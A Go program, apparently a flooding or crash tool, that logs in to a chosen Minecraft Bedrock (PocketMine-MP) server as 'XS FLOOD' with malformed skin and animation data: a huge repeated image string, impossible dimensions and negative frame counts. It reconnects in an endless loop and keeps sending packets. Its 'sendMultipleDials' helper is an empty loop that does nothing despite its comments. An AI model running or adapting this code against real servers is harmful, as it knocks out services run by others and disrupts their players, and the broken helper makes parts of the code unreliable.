package main

import (
	"fmt"
	"log"
	"os"
	"time"
	"strings"

	"github.com/sandertv/gophertunnel/minecraft"
	"github.com/sandertv/gophertunnel/minecraft/auth"
	"github.com/sandertv/gophertunnel/minecraft/protocol"
	"github.com/sandertv/gophertunnel/minecraft/protocol/login"
	"github.com/sandertv/gophertunnel/minecraft/protocol/packet"
)

func main() {
	if len(os.Args) < 3 {
		log.Fatalf("Usage: %s <target IP> <target port>", os.Args[0])
	}

	targetIP := os.Args[1]
	targetPort := os.Args[2]

	// Define persona pieces for the skin
	aid := []login.PersonaPiece{
		{
			Default: true,
			PackID:  "1111111",
			PieceID: "-1",
		},
	}

	// Define animated image data for the skin
	imageString := strings.Repeat("FREE DATA GIVES DIVINE STD", 2425)
	animatedImageData := []login.SkinAnimation{
		{
			Image:              imageString,
			ImageHeight:        1000000000000,
			ImageWidth:         10000000000000000,
			Frames:            -11111111111111111111,
			AnimationExpression: 1111111111111111011,
		},
	}

	// Define client data for the login
	clientData := login.ClientData{
		ThirdPartyNameOnly: true,
		MaxViewDistance:    32, // PocketMine-MP enforces a max of 32 chunks
		MemoryTier:         2,  // Typical memory tier
		IsEditorMode:       false,
		DeviceModel:        "device_model",
		GameVersion:        "1.19.80", // Update this to match PM4/PM5's supported version
		PremiumSkin:        true,
		ThirdPartyName:     "Username",
		SkinData:           "fffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffff",
		CurrentInputMode:   1,
		CapeData:           "hgfhnghnfngfhnf",
		SelfSignedID:       "FFFFFFFFFFFFFFFFFFFFFFFFFFFFF",
		GUIScale:           2, // Valid GUI scale (1-4)
		ServerAddress:      "0.0.0.0:19132",
		TrustedSkin:        true,
		OverrideSkin:       true,
		PersonaPieces:      aid,
		ArmSize:            "wide",
		SkinGeometry:       "geometry.humanoid.custom",
		SkinID:             "Standard_Custom",
		SkinColour:         "0",
		AnimatedImageData:  animatedImageData,
	}

	// Define identity data for the login
	identityData := login.IdentityData{
		DisplayName: "XS FLOOD", // Display name for the player
		TitleID:     "00000000-0000-0000-0000-000000000000", // Valid Title ID
		XUID:        "0000000000000000", // Valid XUID
		Identity:    "noneoefrdsfisdyfe8s79ifdoyrdpisot",
	}

	// Create a dialer with the client and identity data
	dialer := minecraft.Dialer{
		ClientData:   clientData,
		IdentityData: identityData,
		TokenSource:  auth.TokenSource,
	}

	for {
		var conn *minecraft.Conn
		var err error
		baseDelay := time.Second

		// Attempt to connect to the server
		for {
			conn, err = dialer.Dial("raknet", targetIP+":"+targetPort)
			if err == nil {
				log.Println("Sent login dial")
				sendMultipleDials(conn, 5000000)
				break
			}

			// Handle authentication errors
			if strings.Contains(err.Error(), "request XBOX Live token") {
				log.Printf("Authentication error: %v. Retrying in %v...\n", err, baseDelay)
			} else {
				log.Printf("Connection error: %v. Retrying in %v...\n", err, baseDelay)
			}

			time.Sleep(baseDelay)
			baseDelay *= 2 // Exponential backoff
			if baseDelay > time.Minute {
				baseDelay = time.Minute
			}
		}

		// Spawn the player
		if err := conn.DoSpawn(); err != nil {
			log.Printf("DoSpawn error: %v", err)
			continue
		}

		// Read packets from the connection
		for {
			pk, err := conn.ReadPacket()
			if err != nil {
				log.Printf("ReadPacket error: %v. Reconnecting...\n", err)
				break
			}

			// Handle specific packets
			switch p := pk.(type) {
			case *packet.Emote:
				fmt.Printf("Emote packet received: %v\n", p.EmoteID)
			case *packet.MovePlayer:
				fmt.Printf("Player %v moved to %v\n", p.EntityRuntimeID, p.Position)
			}

			// Send a valid chunk radius request
			p := &packet.RequestChunkRadius{ChunkRadius: 32} // PocketMine-MP enforces a max of 32
			if err := conn.WritePacket(p); err != nil {
				log.Printf("WritePacket error: %v. Reconnecting...\n", err)
				break
			}

			// Send a valid UpdateAttributes packet
			p3 := &packet.UpdateAttributes{
				EntityRuntimeID: 1, // Use a valid entity runtime ID
				Tick:            0, // Use a valid tick
				Attributes: []protocol.Attribute{
					{
						AttributeValue: protocol.AttributeValue{
							Name:  "minecraft:health",
							Value: 20.0, // Valid health value
						},
						DefaultMin: 0.0,
						DefaultMax: 20.0,
						Modifiers: []protocol.AttributeModifier{
							{
								Name:   "health_modifier",
								ID:     "00000000-0000-0000-0000-000000000000", // Valid UUID
								Amount: 0.0, // Valid amount
							},
						},
					},
				},
			}

			if err := conn.WritePacket(p3); err != nil {
				log.Printf("WritePacket error: %v. Reconnecting...\n", err)
				break
			}
		}
	}
}

// Simulate sending multiple dials
func sendMultipleDials(conn *minecraft.Conn, numDials int) {
	for i := 0; i < numDials; i++ {
		// Simulate sending dials
		// log.Printf("Dial #%d sent\n", i+1)
	}
}